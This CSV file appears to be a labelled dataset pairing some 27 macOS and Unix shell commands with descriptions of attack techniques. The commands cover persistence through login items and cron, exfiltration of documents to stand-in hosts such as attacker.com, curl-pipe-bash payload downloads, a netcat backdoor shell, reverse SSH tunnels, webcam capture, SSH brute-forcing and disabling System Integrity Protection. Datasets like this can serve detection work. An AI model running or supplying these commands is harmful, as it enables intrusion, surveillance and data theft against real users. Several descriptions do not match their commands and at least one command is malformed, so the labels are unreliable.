"cmd","description"
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious.app"", hidden:false}'","Persistence via login item by adding a malicious application to the user's login items."
"zip -er sensitive_documents.zip ~/Documents/Sensitive/* -P 1234 && curl --upload-file ./sensitive_documents.zip ftp://attacker.com/uploads/","Sensitive documents are compressed into a zip file with a weak password before being exfiltrated."
"ps aux | grep -i 'securityd'","Enumeration of running processes to identify security monitoring tools."
"kill -9 1234","Forceful termination of a monitoring process by process ID."
"nohup ./stealth_process &>/dev/null & disown","Creating a process that hides its presence from the process list."
"curl -s http://malicious-url.com/fakeupdate.sh | bash","Malware installation using a disguised script that appears to be a legitimate software update."
"hdiutil mount fakecodec.dmg && open /Volumes/FakeCodec/Install.pkg","Trojan application execution that masquerades as a benign video codec installer."
"echo 'while true; do nc -l 4444 -e /bin/bash; done' | nohup bash &","Backdoor payload execution by injecting code into an existing trusted process."
"launchctl submit -l com.hidden.webcam -- /usr/bin/python -c 'import cv2; camera = cv2.VideoCapture(0); ret, image = camera.read(); cv2.imwrite(""/Users/Shared/captured.jpg"", image)'","Webcam hijacking by installing a hidden service that silently captures images."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious/script"", hidden:false}'","Persistence on a macOS system by inserting a malicious script into login items."
"tar -czvf confidential-docs.tar.gz ~/Documents/confidential && curl --upload-file ./confidential-docs.tar.gz http://malicious-url.com/upload","Compressing and exfiltrating sensitive documents from a macOS system using tar and gzip."
"zip -r /tmp/documents.zip ~/Documents && openssl base64 -in /tmp/documents.zip | mail -s 'Documents' recipient@example.com","Exfiltrating documents from a macOS system and sending them via email."
"ssh -f -N -T -R 2222:localhost:22 user@attacker.com","Persistence via SSH tunneling for unauthorized remote access and data exfiltration."
"hydra -l user -P /path/to/wordlist.txt ssh://target.com","Using SSH to brute force access to a remote system."
"ssh -f -N -T -R 9999:localhost:3306 user@attacker.com","Establishing a reverse SSH tunnel to forward ports for capturing network traffic."
"while true; do top -l 1 | grep -E 'process_name|PID' >> /tmp/hiddenlog; sleep 300; done","Stealth monitoring of system processes on macOS using the top command."
"echo '* * * * * echo ""malicious code""' >> /etc/crontab","Privilege escalation by injecting code into a root-owned cron job file without proper permissions."
"echo '* * * * * /usr/local/bin/malicious_script.sh' | crontab -","Using cron jobs for persistence by executing a script from an unauthorized location every minute."
"echo '* * * * * curl -fsSL http://malicious-url.com/payload.sh | bash' | crontab -","Bypassing security measures with cron-based triggers to download and execute a payload."
"csrutil disable","Disabling System Integrity Protection (SIP) to allow cron job execution with elevated privileges."
"bash -c ""$(curl -fsSL http://malicious-url.com/install.sh)""","Malware installation through a disguised Bash script attached to an email, which when executed, downloads a payload from a remote server and runs it."
"echo 'malicious.server.com ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7' >> ~/.ssh/known_hosts","Persistent SSH key exchange manipulation by adding a malicious server's public key to the known_hosts file."
"echo 'Protocol 1' >> ~/.ssh/config","Forcing an SSH protocol downgrade to a less secure version susceptible to known vulnerabilities."
"for user in $(cat users.txt); do for pass in $(cat passwords.txt); do ssh $user@victim.com -o 'BatchMode=no' -o 'PasswordAuthentication=yes' -o 'StrictHostKeyChecking=no' -o 'UserKnownHostsFile=/dev/null' -o 'IdentitiesOnly=yes' -o 'ChallengeResponseAuthentication=no' -o 'KbdInteractiveAuthentication=no' -o 'PubkeyAuthentication=no' -o 'RhostsRSAAuthentication=no' -o 'RSAAuthentication=no' -o 'HostbasedAuthentication=no' -o 'GSSAPIAuthentication=no' -o 'GSSAPIDelegateCredentials=no' -o 'PasswordAuthentication=yes' -o 'UsePAM=no' -o 'ServerAliveInterval=60' -o 'ServerAliveCountMax=3' -p 22 -v -f -N -l $user -pw $pass; done; done","Automating SSH brute force attacks using a script to try various password combinations on a list of usernames."
"osascript -e 'do shell script ""chown root: /tmp/unsigned_driver.kext && chmod 4755 /tmp/unsigned_driver.kext && kextload /tmp/unsigned_driver.kext"" with administrator privileges'","Privilege escalation through exploitation of a kernel vulnerability using an unsigned driver to abuse IOKit interfaces."
"touch -a -m -t 202301010000 /path/to/file","Changing file access and modification times to hide evidence of file access on a macOS system."
"curl -s http://compromised-website.com/malicious-install.sh | /bin/bash","Malware installation using a malicious bash script hosted on a compromised website."
